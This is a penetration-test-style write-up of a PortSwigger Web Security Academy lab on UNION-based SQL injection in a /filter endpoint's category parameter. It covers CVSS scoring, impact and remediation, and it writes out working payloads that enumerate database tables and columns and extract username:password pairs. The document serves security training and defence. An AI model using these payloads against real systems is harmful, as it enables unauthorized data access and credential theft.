# SQL Injection – UNION-Based, Listing Database Contents (Non-Oracle)

## 1. Summary
During testing of the `category` filter functionality on the target web application, a SQL Injection vulnerability was identified in the `category` parameter of the `/filter` endpoint. The input was not properly sanitized, allowing an attacker to manipulate the backend SQL query using the `UNION SELECT` technique. This enabled enumeration of database schema information (tables and columns) and extraction of sensitive data, including stored usernames and passwords from the `users_jpbepc` table.

## 2. Vulnerability Type and Affected Endpoint/Parameter
- **Vulnerability type:** SQL Injection (UNION-based)
- **Affected endpoint:** `/filter`
- **Affected parameter:** `category`
- **Target URL:** `https://0af400fc03d8900580f88a0c002600c0.web-security-academy.net/filter?category=Tech+gifts`

## 3. Severity (CVSS)
**CVSS v3.1 Vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`
**Base Score:** 9.1 (Critical)

**Rationale:**
- **Attack Vector: Network** – The parameter is exploitable remotely via a standard HTTP GET request.
- **Attack Complexity: Low** – No special conditions are required; the injection point was found and exploited directly.
- **Privileges Required: None** – No authentication was needed to reach the vulnerable endpoint.
- **User Interaction: None** – The attacker can trigger the payload without involving another user.
- **Confidentiality: High** – Full database contents (table names, column names, and credential data) were extracted.
- **Integrity: None** – The payloads used were limited to data extraction (`SELECT`); no data modification was performed or demonstrated.
- **Availability: None** – No impact on system availability was observed or attempted.

## 4. Steps to Reproduce
1. Navigated to the target URL and identified the `category` parameter as user-controllable input reflected in a backend SQL query.
2. Tested the number of columns returned by the original query using a `UNION SELECT NULL,NULL--` style payload, confirming that the query returns **2 columns**, where the first column is numeric and the second is a string type.
3. Enumerated database table names using:
   ```
   GET /filter?category=Tech+gifts' UNION SELECT NULL,table_name FROM information_schema.tables-- HTTP/2
   ```
   This identified a table of interest: `users_jpbepc`.
4. Enumerated the column names of the `users_jpbepc` table using:
   ```
   GET /filter?category=Tech+gifts' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users_jpbepc'-- HTTP/2
   ```
   This revealed two relevant columns: `username_eduxjo` and `password_rjuqbq`.
5. Extracted the credential data stored in these columns using:
   ```
   GET /filter?category=Tech+gifts' UNION SELECT string_agg(username_eduxjo || ':' || password_rjuqbq, ','),NULL FROM users_jpbepc -- HTTP/2
   ```
   This returned the full set of usernames and passwords concatenated as `username:password` pairs, confirming successful data extraction and solving the lab.

## 5. Proof of Concept (Payload and Result)
*Not included in this writeup (omitted intentionally to save time/resources).*

## 6. Impact
Exploitation of this vulnerability allows an unauthenticated attacker to:
- Enumerate the full database schema (tables and columns), exposing internal data structure.
- Extract sensitive data stored in the database, including user credentials (usernames and passwords).
- Potentially use extracted credentials to authenticate as legitimate users, leading to account takeover.
- Depending on database privileges, a UNION-based injection point can often be extended to other SQL injection techniques (e.g., stacked queries) that may allow data modification or further compromise, although this was not tested here.

## 7. Remediation
- Use **parameterized queries / prepared statements** for all database interactions involving user-supplied input. Never concatenate user input directly into SQL statements.
- Apply **strict input validation** on the `category` parameter (e.g., allow-list of expected values).
- Enforce the **principle of least privilege** for the database account used by the application, restricting access to `information_schema` and other system views where not required.
- Store passwords using a strong, salted hashing algorithm (e.g., bcrypt, Argon2) rather than in plaintext or reversible form, to limit damage if data is exposed.
- Implement a **Web Application Firewall (WAF)** as a defense-in-depth measure to detect and block common SQL injection patterns.
- Conduct regular code review and automated static/dynamic security testing to catch injection flaws before deployment.

## 8. References
- [OWASP – SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger Web Security Academy – SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/union-attacks)
- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
